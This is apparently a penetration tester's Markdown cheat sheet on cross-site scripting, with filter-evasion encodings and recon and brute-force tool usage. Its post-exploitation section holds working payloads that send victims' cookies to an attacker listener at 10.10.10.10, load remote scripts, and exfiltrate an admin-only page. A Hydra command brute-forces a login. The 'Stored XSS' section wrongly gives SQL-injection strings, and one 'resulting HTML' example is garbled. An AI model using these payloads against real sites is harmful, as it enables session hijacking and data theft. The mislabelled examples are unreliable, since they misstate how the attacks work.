# Cross-Site Scripting (XSS)

## Table of Contents

- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
  - [Table of Contents](#table-of-contents)
  - [Overview](#overview)
  - [Types of XSS](#types-of-xss)
    - [Reflected XSS](#reflected-xss)
    - [Stored XSS](#stored-xss)
    - [DOM-Based XSS](#dom-based-xss)
  - [Filter Evasion](#filter-evasion)
    - [`fromCharCode` — Avoids Quotation Marks](#fromcharcode--avoids-quotation-marks)
    - [Decimal HTML Encoding — Avoids Keyword Filters](#decimal-html-encoding--avoids-keyword-filters)
    - [Unicode Encoding — Single Quotes and Uppercase Tags](#unicode-encoding--single-quotes-and-uppercase-tags)
  - [Post-Exploitation Payloads](#post-exploitation-payloads)
    - [Cookie Stealing](#cookie-stealing)
    - [Remote Script Loading](#remote-script-loading)
  - [Recon Tools](#recon-tools)
    - [Nmap — Web Server Version](#nmap--web-server-version)
    - [Nikto — Passive Web Scanner](#nikto--passive-web-scanner)
    - [Wapiti — Active Fuzzing Scanner](#wapiti--active-fuzzing-scanner)
    - [DIRB — Directory Brute-forcing](#dirb--directory-brute-forcing)
    - [Hydra — Login Brute-forcing](#hydra--login-brute-forcing)
  - [Files](#files)
  - [References](#references)
    - [Challenges](#challenges)
    - [Web Sites](#web-sites)

---

## Overview

Techniques for identifying and exploiting XSS vulnerabilities in web applications, including filter evasion and post-exploitation payloads.

---

## Types of XSS

### Reflected XSS
User input is immediately returned by the server in the response without being stored. The payload is delivered via a crafted URL or form field and executes in the victim's browser.

For instance, the following value can be used to show the cookies of the running web app:

```html
<!-- Basic cookie disclosure -->
<SCRIPT>alert(document.cookie)</SCRIPT>
```

### Stored XSS
The malicious payload is saved server-side (e.g., in a database) and served to every user who views the affected page. Common entry points include comment fields, usernames, and profile data.

For instance, a login form with a SQL injection vulnerability can be exploited to let you log in as known user with the following payload as a password to make the check always true.
```js
" or "1"="1
```
or
```js
' or "1"='1
```

### DOM-Based XSS
The vulnerability exists entirely in client-side JavaScript. Unsanitized input is written directly to the DOM without server involvement.

A common use case is HTML logic using an unsanitized "query". For instance,
```js
// Vulnerable pattern — query parameter written directly into HTML
'<div hidden><img src="/resources/search_assets/search.gif?query=' + query + '"></div>'
```

Below is a query to inject a script. Note the importance of valid quotes
(' vs. ") to build a valid HTML after the injection. The `"` is used to close the attribute and `'` is used inside the handler to avoid breaking the outer string:

```js
query = " onerror="alert('XSS')
```

Resulting HTML after injection:

```html
'<div hidden><img src="/resources/search_assets/search.gif?query=' + " onerror="alert('XSS') + '"></div>'
```

---

## Filter Evasion

If a filter has been configured to block specific characters or keywords in the user's input (e.g., double quotes), a user may use alternate payloads or encodings to evade the filter.

### `fromCharCode` — Avoids Quotation Marks

To call the equivalent of `alert("XSS")`, we can use the JavaScript `fromCharCode` function to create an XSS payload using ASCII character codes:

```html
<img src=javascript:alert(String.fromCharCode(88,83,83))>
```

This payload avoids quotation marks, allowing it to bypass the filter. Then, the code is executed when the page is loaded, displaying an alert box.

### Decimal HTML Encoding — Avoids Keyword Filters

Alternatively, the payload could be encoded using decimal encoding to evade filters that prohibit specific keywords (such as `javascript` or `alert`) or characters from being used.

For instance, by encoding the characters of `alert("XSS")` into their respective decimal representations, you can create a payload that's challenging to recognize, but can still evade the filter and be injected into the application:

```html
<!-- Equivalent to: <h1>Hello, <img src=XSS onerror=alert("XSS") /></h1> -->
<h1> Hello, <img src=XSS onerror=&#000097;&#0000108;&#0000101;&#0000114;&#0000116;&#000040;&#000034;&#000088;&#000083;&#000083;&#000034;&#000041 /> </h1>
```

When the page is loaded, the browser decodes the encoded input to its equivalent HTML representation, executing the code.

Other decimal-encoded payloads:

```js
<!-- <script>alert("XSS")</script> -->
&#000060;&#0000115;&#000099;&#0000114;&#0000105;&#0000112;&#0000116;&#000062;&#000097;&#0000108;&#0000101;&#0000114;&#0000116;&#000040;&#000034;&#000088;&#000083;&#000083;&#000034;&#000041;&#000060;&#000047;&#0000115;&#000099;&#0000114;&#0000105;&#0000112;&#0000116;&#000062

<!-- onload="alert('XSS')" -->
&#0000111;&#0000110;&#0000108;&#0000111;&#000097;&#0000100;&#000061;&#000034;&#000097;&#0000108;&#0000101;&#0000114;&#0000116;&#000040;&#000039;&#000088;&#000083;&#000083;&#000039;&#000041;&#000034
```

### Unicode Encoding — Single Quotes and Uppercase Tags

We can also use uppercase tags and the Unicode representation of single quotes:

```html
<IMG SRC=\u0027\u0027 ONERROR=alert(\u0027XSS\u0027) >
```

---

## Post-Exploitation Payloads

### Cookie Stealing

The `document.cookie` property in JavaScript is used to read or write cookies associated with the current document or webpage and contains all the cookies stored for the current domain.

This property can be exploited to send cookies to a remote server.

> [!NOTE]
> Useful when the `HTTPOnly` flag is **not** set on the session cookie.

For example, the payload below uses `<script>` tags to exploit an XSS vulnerability and send the contents of `document.cookie` to an attacker-controlled listener server (in this example, 10.10.10.10):

```html
<!-- Using <script> tags -->
<script>var XSS=new Image;XSS.src="http://10.10.10.10:5555/?"+document.cookie;</script>
```

Alternatively, this payload uses `<img>` tags, ultimately sending the user's cookies to the attacker's controlled server when the `onerror` event handler is called.

```html
<!-- Using <img> onerror — self-removes to prevent infinite loop -->
<img src=XSS onerror="this.src='http://10.10.10.10:5555/?'+document.cookie; this.removeAttribute('onerror');" />
```

Without the `this.removeAttribute('onerror');` line in the payload, any code within the `onerror` handler will loop indefinitely, which can impact the performance of the application. By including this line, the `onerror` attribute will be removed when the script is run, so it'll only be executed once.

Both these payloads will attempt to access the attacker's server and include the user's cookies as the URL query parameters. From the attacker's perspective, they would need to open a listener on port `5555` and wait for a user to trigger the XSS vulnerability. When the vulnerable page is loaded, the script executes, establishing a connection back to the attacker's server:

```bash
$ nc -nvlp 5555
```
```
listening on [any] 5555 ...
connect to [10.10.10.10] from (UNKNOWN) [32.14.43.10] 39110
GET /?username=admin&sessionID=033cec0d4a4b9b711069 HTTP/1.1
Host: 10.10.10.10:5555
Connection: keep-alive
...
```

The received data reveals the contents of the user's cookies:
```
GET /?username=admin&sessionID=033cec0d4a4b9b711069 HTTP/1.1
```

Using this data, a malicious user could substitute their cookies with those of the targeted user and impersonate them on the web application.

> [!NOTE]
> Stealing a user's cookies is becoming less common due to the implementation of preventive measures by many applications. One such measure is using the `HTTPOnly` flag for cookies, which prevents them from being accessed in this manner. Even if the user triggers an XSS vulnerability, the client-side code can't read the cookie with the `HTTPOnly` flag and will not send it to the attacker.

### Remote Script Loading

For longer payloads, host a script on an attacker-controlled server and load it remotely:

For longer scripts, it might not be practical to include all the necessary JavaScript code within a single XSS payload. In this scenario, you can host a script on an attacker-controlled server and invoke the client-side code from a remote location.

For instance, consider the following payload:
```html
<script src="http://10.10.10.10:8080/script.js"></script>
```

When this payload is used, the application tries to fetch a file called `script.js` from the URL `http://10.10.10.10:8080`, which is controlled by the attacker. If the script file is accessible at that location and contains valid JavaScript, the code within it will be executed when the page loads.

You can host a JavaScript file using the Python `http.server` module. Run the following command to start an HTTP server on port 8080.

```bash
python3 -m http.server 8080
```

Use a browser to port 8080 on the attacker desktop (e.g., `http://10.10.10.10:8080`) to see the hosted files.

Example `script.js`. It fetches a protected page and exfiltrates its contents:

```js
var sensitive_data = new XMLHttpRequest();
sensitive_data.open("GET", "/users/data", true);
sensitive_data.responseType = "text";
sensitive_data.onload = () => {
  if (sensitive_data.status >= 200 && sensitive_data.status < 400) {
    var body = sensitive_data.responseText;
    var send_data = new XMLHttpRequest();
    send_data.open("POST", "http://10.10.10.10:5555", true);
    send_data.send("page_body=" + body);
  }
};
sensitive_data.send();
```

In this code, the response from the initial request is sent through a POST request to a server controlled by the attacker. When the malicious user receives the POST request, it will contain the contents of the admin-only page in the request data.

---

## Recon Tools

These tools help identify XSS and other web vulnerabilities before manual exploitation.

### Nmap — Web Server Version
You can use Nmap to scan an application to identify which version of a web server is in use.

This can be done with the command `nmap -sV -p80 <server>`, with the `-sV` Nmap flag used to enable version detection.

### Nikto — Passive Web Scanner
Nikto is a web server scanner that performs comprehensive tests against an application, attempting to identify vulnerabilities in the application as well as attempting to identify additional characteristics about the application itselfe, e.g., identify misconfigurations, missing headers, and potential vulnerabilities.

Running Nikto with the command:
```bash
nikto -host <URL>
```
will run the tool with its default configuration:
- searching for cookies in use,
- reporting on server headers, and
- identifying potential vulnerabilities in the aplication.

For instance,
```bash
$ nikto -host http://ozone-energy.bitnet
```
```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.102.90.66
+ Target Hostname:    ozone-energy.bitnet
+ Target Port:        80
+ Start Time:         2024-10-31 04:04:09 (GMT0)
---------------------------------------------------------------------------
+ Server: nginx
+ /: Cookie TrackingID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /static/favicon.ico: Server may leak inodes via ETags, header found with file /static/favicon.ico, inode: 1660864472.0, size: 15406, mtime: 2348288552. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /static/favicon.ico: Uncommon header 'content-disposition' found, with contents: inline; filename=favicon.ico.
+ OPTIONS: Allowed HTTP Methods: OPTIONS, POST, GET, HEAD .
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 7963 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2024-10-31 04:04:19 (GMT0) (10 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Key findings to look for:
- missing `HTTPOnly` flags on cookies,
- absent `X-Frame-Options`,
- exposed config files.

### Wapiti — Active Fuzzing Scanner
Wapiti is a web server scanner that adds fuzzing to its toolkit. This functionality   allows Wapiti to send payloads directly to the target application giving Wapiti the ability to confirm the existence of vulnerabilities, not just identify them.

This tool allows you to go beyond passive scanning by sending payloads to confirm vulnerabilities.

By default, Wapiti runs a subset of the modules included with the tool.
```bash
wapiti -u <URL>
```
For instance,
```bash
$ wapiti -u http://ozone-energy.bitnet
```

For a more comprehensive scan, the `-m` flag allows the user to specify which modules to run:
- `-all` for all modules
- `-cookieflags` to identify the name of the cookie created without the `HTTPOnly` or `Secureflag` on the application
- `-xss` to identify XSS vulnerabilities

### DIRB — Directory Brute-forcing
Discovers hidden paths that may expose additional attack surface. It uses a default wordlist, unless one is provided.

```bash
dirb <URL> [<word-list-file>]
```
```
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Thu Oct 31 02:55:16 2024
URL_BASE: http://ozone-energy.bitnet/
WORDLIST_FILES: /usr/share/wordlists/custom/ozone-wordlist.txt

-----------------

GENERATED WORDS: 64

---- Scanning URL: http://ozone-energy.bitnet/ ----
+ http://ozone-energy.bitnet/login (CODE:200|SIZE:4692)

-----------------
END_TIME: Thu Oct 31 02:55:16 2024
DOWNLOADED: 64 - FOUND: 1
```

For instance,
```bash
$ dirb http://ozone-energy.bitnet /usr/share/wordlists/custom/ozone-wordlist.txt
```

### Hydra — Login Brute-forcing
Once a login portal is identified, you can use Hydra to brute-force weak credentials.

Use the following command to attempt to login as a given user (`-l <username>`) using a password list (`-P <word-list-file>`) on a given `<server>` using a specific page and arguments:
```bash
hydra -l <username>> -P <word-list-file> <server> http-form-post "/login:username=^USER^&password=^PASS^&Login=Login:Invalid Username or Password"
```

For instance,
```bash
$ hydra -l test -P /usr/share/wordlists/custom/ozone-wordlist.txt ozone-energy.bitnet http-form-post "/login:username=^USER^&password=^PASS^&Login=Login:Invalid Username or Password"
```
```
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-31 03:40:41
[DATA] max 16 tasks per 1 server, overall 16 tasks, 64 login tries (l:1/p:64), ~4 tries per task
[DATA] attacking http-post-form://ozone-energy.bitnet:80/login:username=^USER^&password=^PASS^&Login=Login:Invalid Username or Password
[80][http-post-form] host: ozone-energy.bitnet   login: test   password: test
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-31 03:40:43
```

---

## Files

| File | Description |
|---|---|
| [`script_test.js`](./script_test.js) | Function to send data to a controlled server |
| [`script_execute.js`](./script_execute.js) | Inject a command to be executed |
| [`script_execute_node.js`](./script_execute_node.js) | Inject command to be executed in Node |

---

## References

### Challenges
| Source | Name |
|---|---|
| N/A | N/A |

### Web Sites
- [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)
- [PayloadsAllTheThings - XSS](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [HackTricks - XSS](https://angelica.gitbook.io/hacktricks/pentesting-web/xss-cross-site-scripting)
